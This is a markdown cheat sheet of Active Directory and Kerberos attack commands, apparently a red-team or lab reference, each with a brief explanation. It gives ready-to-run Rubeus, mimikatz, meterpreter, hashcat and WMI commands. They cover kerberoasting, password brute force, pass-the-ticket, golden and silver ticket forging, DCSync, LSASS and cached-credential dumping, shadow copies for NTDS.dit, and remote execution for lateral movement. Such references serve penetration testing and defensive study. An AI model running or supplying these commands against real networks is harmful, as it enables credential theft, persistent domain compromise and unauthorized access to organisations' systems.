# Active Directory & Kerberos Enumeration

---

## Active Directory Enumeration (PowerShell)

### Find Unconstrained Delegation

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq "True"}
Get-ADComputer -Filter {TrustedForDelegation -eq "True"}
```

Queries AD for **user and computer accounts** with unconstrained delegation enabled. These accounts will cache Kerberos tickets (including TGTs) for any user that authenticates to them — a high-value target for ticket theft.

---

### Query Autorun Registry Keys

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Lists programs configured to run automatically at system startup. Used to identify persistence mechanisms or hijackable autorun entries. Add `/v <key>` and `/d <path>` to add new entries.

---

### Check Domain Computer Password Last Set

```powershell
[DateTime]::FromFileTime((Get-ADComputer brussels-dc01 -Properties pwdlastset).pwdlastset)
```

Retrieves when a machine account's password was last rotated. Useful for identifying stale machine accounts or confirming a password reset took effect.

---

## Kerberoasting

```
Rubeus.exe kerberoast
```

Requests **service tickets (TGS)** for all accounts with a `servicePrincipalName` (SPN) set. The tickets are encrypted with the service account's password hash, which can then be cracked offline. Targets misconfigured service accounts.

---

## Brute Force / Password Spraying

```
Rubeus.exe brute /user:sql_svc /passwords:passwordlist.txt
```

Attempts each password in a wordlist against a specific user account via Kerberos pre-authentication (AS-REQ). Less noisy than NTLM-based spraying as it targets the KDC directly.

---

## Kerberos Ticket Monitoring

```
Rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap
```

Polls for new Kerberos tickets in memory every 5 seconds, filtered to a specific account (here the DC machine account `DC$`). Used in conjunction with authentication coercion to catch incoming TGTs.

---

## Pass-the-Ticket (PTT)

```
Rubeus.exe ptt /ticket:<base64_ticket>
```

Injects a base64-encoded Kerberos ticket into the current logon session. Allows impersonation of the ticket's owner without knowing their password.

---

## Purge Tickets

```
Rubeus.exe purge
```

Clears all Kerberos tickets from the current session. Used to clean up before injecting a new ticket to avoid conflicts.

---

## DCSync (Credential Extraction)

```
mimikatz # lsadump::dcsync /user:krbtgt
```

Simulates the behaviour of a domain controller replication request (MS-DRSR) to pull password hashes for any account from AD — without needing to touch LSASS on the DC. Requires `Domain Admins`, `Domain Controllers`, or `Replicating Directory Changes` privileges.

---

## Golden Ticket Generation

```
Rubeus.exe golden /aes256:<krbtgt_aes256_hash> /ldap /user:Administrator /ptt /nowrap
```

Forges a **TGT for any user** using the `krbtgt` account's hash. The ticket is not verifiable by DCs without the `krbtgt` hash, giving persistent domain-wide access. `/ldap` pulls group info from AD automatically.

---

## Silver Ticket Generation

```
Rubeus.exe silver /service:cifs/ws1987.brussels.coalgasoil.com /aes256:<machine_aes256> /user:Administrator /ldap /ptt
```

Forges a **TGS for a specific service** using that service's account hash (here a machine account). More stealthy than a golden ticket — only valid for the targeted service. CIFS grants SMB filesystem access.

---

## DPAPI — Machine Master Keys

```
SharpDPAPI.exe machinemasterkeys
```

Enumerates and attempts to decrypt **DPAPI machine master keys**. These keys protect secrets stored by the system (e.g. scheduled task credentials, IIS app pool passwords, Wi-Fi keys).

---

## Cached Credential Extraction

```
mimikatz # lsadump::cache
```

Dumps **Domain Cached Credentials (DCC2/MSCacheV2)** from the registry (`HKLM\SECURITY\Cache`). These are stored for offline domain logon and can be cracked with hashcat (`-m 2100`).

```
hashcat -m 2100 -a 0 '$DCC2$10240#username#<hash>' wordlist.txt
```

---

## LSASS Credential Extraction

```
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

Dumps credentials from **LSASS memory** — including plaintext passwords (if WDigest is enabled), NTLM hashes, Kerberos tickets, and DPAPI keys for all interactively logged-on users.

---

## Shadow Copy Creation

```
vssadmin create shadow /for=C:
```

Creates a Volume Shadow Copy of the C: drive. Allows access to locked files (e.g. `NTDS.dit`, `SYSTEM` hive) without stopping services, enabling offline credential extraction from a DC.

---

## Remote Execution via WMI

```
wmic /node:"brussels-dc01" process call create 'cmd /c "C:\agent.exe"'
```

Executes a process on a remote host via WMI. Requires admin credentials. Commonly used for lateral movement after obtaining valid hashes or tickets.

---

## Reset Machine Account Password

```powershell
Reset-ComputerMachinePassword
```

Resets the **local machine's AD computer account password**. Useful for re-syncing a machine account after manipulation, or forcing a new password to invalidate prior silver tickets forged with the old hash.
